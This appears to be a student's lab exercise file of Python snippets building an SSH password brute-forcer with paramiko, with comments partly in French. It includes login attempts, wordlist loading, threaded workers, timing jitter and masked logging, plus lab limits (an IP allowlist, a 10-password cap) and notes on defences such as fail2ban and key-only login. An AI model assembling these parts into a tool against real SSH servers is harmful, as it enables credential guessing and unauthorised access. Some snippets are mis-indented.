#Ex2 
import paramiko

def try_ssh_login(host, port, username, password, timeout=3.0):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            host, port=port,
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False
        )
        return {"outcome": "success"}

    except paramiko.AuthenticationException:
        return {"outcome": "failure"}

    except Exception as e:
        return {"outcome": "error", "error": str(e)}

    finally:
        client.close()
#Ex3
    def get_banner(client):

     transport = client.get_transport()
     if transport:
        return transport.remote_version
    return None
#Ex4
def load_wordlist(path):
    passwords = []
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                passwords.append(line)
    return passwords[:10]  # lab-safe limit


#Ex5
import time
import ipaddress

def is_allowed_ip(ip):
    return (
        ip == "127.0.0.1" or
        ipaddress.ip_address(ip) in ipaddress.ip_network("192.168.56.0/24")
    )

def brute_sequential(host, port, username, passwords):
    if not is_allowed_ip(host):
        print("Blocked: IP not allowed in lab")
        return

    for i, pw in enumerate(passwords[:10]):
        print(f"Trying {i+1}: {pw}")
        time.sleep(1)

#Ex6
        import time

def handle_errors(errors_count):
    if errors_count >= 3:
        print("Too many errors → sleep 30s")
        time.sleep(30)
        return 0
    else:
        time.sleep(2)
        return errors_count
    
#Ex7
    import random
    import time

    def sleep_with_jitter(min_s, max_s):
     time.sleep(random.uniform(min_s, max_s))


#Ex8

    def worker(host, port, username, q, event, lock):
     count = 0

     while not event.is_set():
        if count >= 3:
            return

        try:
            password = q.get_nowait()
        except:
            return

        count += 1

        with lock:
            print("Trying:", password)

#Ex9
#Queue.get() = producteur/consommateur
#pas de doublons
# équilibrage automatique
# threads safe

#Split manuel = risque :
# surcharge d’un thread
# duplication ou tâches perdues



#Ex10
import logging

logging.basicConfig(
    filename="brute_scan.log",
    level=logging.INFO
)

def mask(pw):
    return pw[:1] + "****" + pw[-2:]

def log_attempt(pw):
    logging.info(f"Attempt: {mask(pw)}")


#Ex11
#Fail2ban → bloque IP après échecs
#SSH keys (désactive password login)
#2FA (mot de passe + code téléphone)
#Port knocking
#Impact du jitter :
#jitter n’échappe pas à fail2ban
#il peut réduire la régularité des logs
#mais les seuils restent détectables

#Ex12
    import time

def print_summary(host, attempts, start, success=False, banner=None):
    duration = time.time() - start
    rate = attempts / duration if duration > 0 else 0

    print("\n===== SUMMARY =====")
    print("Host:", host)
    print("Attempts:", attempts)
    print("Duration:", round(duration, 2), "s")
    print("Speed:", round(rate, 2), "attempts/s")
    print("Success:", success)
    print("SSH Banner:", banner)
    print("===================")